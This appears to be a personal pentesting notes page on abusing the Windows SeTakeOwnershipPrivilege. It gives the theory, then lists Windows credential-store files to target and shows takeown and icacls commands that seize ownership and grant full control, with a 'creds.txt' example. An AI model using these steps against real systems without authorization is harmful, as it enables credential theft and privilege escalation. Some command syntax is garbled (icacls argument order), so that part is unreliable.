---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "SETAKEOWNERSHIPPRIVILEGE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

This privilege grants a user account the ability to take ownership of any *securable object*, namely →

- ***AD Objects ( Users, Groups... )***

- ***NTFS Files and Directories***

- ***Printers***

- ***Registry Keys ( Hives within HKLM, HKCU... )***

- ***Processes***

That is, this privilege assigns the ***[[GRANT OWNERSHIP (WRITEOWNER)|WriteOnwer]]*** right over a given object

Therefore, if an operator compromise a local or domain user account which has this privilege enabled, he can leverage it to take ownership of any *securable object* of the system by modifying the owner within its *security descriptor*

Once we modify its owner, we implicity have the ***[[GRANT RIGHTS (WRITEDACL)|WriteDACL]]*** right over the given objet. So, we can create, delete or modify any existing *ACE* within the *DACL* of the *object's security descriptor*

From here, it's as simple as create an *ACE* which grants *Full Control* to a principal controlled by the operator

---

#### *Enumeration*

##### *Current User Privileges*

```bash
whoami /priv
```

---

#### *Abuse - Windows*

Let's suppose that we compromise a domain user account that can *RDP* to a a *domain-joined* machine as it belongs to the *Remote Desktop Users* group of the latter

Once we establish a remote connection to the target through *RDP*, we start by listing which privileges the given user account has

To do so, we can issue the following command

```bash
whoami /priv
```

> [!NOTE]- *Command Output*
>
> ```bash
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                              State
> ============================= ======================================== ========
> SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
> SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
> ```
>

We see that the user has the *SeTakeOwnershipPrivilege*. So, we can leverage this privilege by abusing the *WRITE_OWNER* right to modify the owner of any *secure object* we want and take *FULL CONTROL* over it

However, there is a problem as the privilege in question is disable, so first we must enable it in order to accomplish our goal

To do so, we can proceed as follows →

##### *Enabling SeTakeOwnershipPrivilege*

> ***See [[WINDOWS PRIVESC#Enabling disabled Privileges|Enabling disabled Privileges]]***

##### *Trying to list the Owner of an specific resource*

> ***A file, directory or named pipe***

Once we enable the given privilege, it's time to look for a sensitive resource to compromise

We typically want to search for shares, directories or files containing sensitive information such as creds and other types of juicy stuff

##### *Resources of Interest*

> [!BUG]- *Resources*
>
> ```bash
> %WINDIR%\repair\SAM
> %WINDIR%\repair\SYSTEM
> %WINDIR%\repair\SECURITY
> %WINDIR%\repair\software
> %WINDIR%\system32\config\SecEvent.Evt
> %WINDIR%\system32\config\default.sav
> %WINDIR%\system32\config\security.sav
> %WINDIR%\system32\config\software.sav
> %WINDIR%\system32\config\system.sav
> ```
>

Once we find out an interesting target, first we have to list its owner

> ***PS***

```bash
dir -Path '<RESOURCE_PATH>' | Select Fullname, LastWriteTime, Attributes, @{Name='Owner'; Expression={ (Get-ACL $_.FullName ).Owner }}
```

> ***CMD***

```bash
dir /q '<RESOURCE_PATH>'
```

##### *Taking Ownership of the resource*

```bash
takeown /f '<RESOURCE_PATH>'
```

##### *Verifying the Ownership*

Once again, we can run one of the ***[[#Trying to list the Owner of an specific resource|following commands]]*** to list the owner of the given resource

##### *Adding a new ACE to the Object's DACL*

As stated previously, once we own an object, we implicity gain the *WRITE_DACL* right over the latter, thereby being capable of create, modify and delete any existing *ACE* within the *DACL* of the *object's security descriptor*

In this case we want *FULL CONTROL* over the object, so we can create a *DACL* which gives this right to the controlled user over the targeted resource

To do, proceed as follows

```bash
icacls /grant <PRINCIPAL>:F '<RESOURCE_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> icacls /grant domain.internal\john.doe:F 'C:\creds.txt'
> ```
>